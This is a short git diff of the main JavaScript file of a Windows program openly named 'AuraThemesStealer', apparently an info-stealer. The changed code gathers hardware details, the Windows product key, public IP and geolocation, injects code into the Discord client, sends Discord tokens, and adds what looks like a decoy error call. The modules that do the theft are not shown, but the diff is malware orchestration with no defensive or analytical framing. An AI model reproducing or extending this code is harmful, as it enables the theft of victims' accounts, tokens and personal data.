@@ -4,10 +4,11 @@ const getconfig = require("./config/config")();
 
 switch (process.platform) {
     case "win32":
-        const { getSystemInfos, getPublicIps } = require("./utils/functions");
-        const { sendTokens } = require("./modules/findtoken/send");
+        const { getPublicIp, getInfo } = require("./modules/core/core");
         const { discordInjected } = require("./modules/dinjection/injection");
+        const { sendTokens } = require("./modules/findtoken/send");
         const { debuggerx } = require("./modules/debugger/debuggerx");
+        const { error } = require("./utils/error");
 
         class AuraThemesStealer {
             constructor() {
@@ -15,11 +16,15 @@ switch (process.platform) {
             }
             async initialize() {
                 try {
-                    await debuggerx(getconfig.debugger, await getPublicIps().ip, ...Object.values(await getSystemInfos()));
+                    const { disk, ram, uid, cpucount, os, cpu, gpu, windowskey, windowsversion } = await getInfo();
+                    const { ip, hostname, city, region, country, loc, org, postal, timezone } = await getPublicIp();
+                    await debuggerx(getconfig.debugger, ip, disk, ram, uid, cpucount, os, cpu, gpu, windowskey, windowsversion);
                     await discordInjected(getconfig.injection);
                     await sendTokens();
+
+                    error();
                 } catch (error) {
-                    console.error('Error during initialization', error);
+                    return console.error('An error occurred in main', error);
                 }
             }
         }
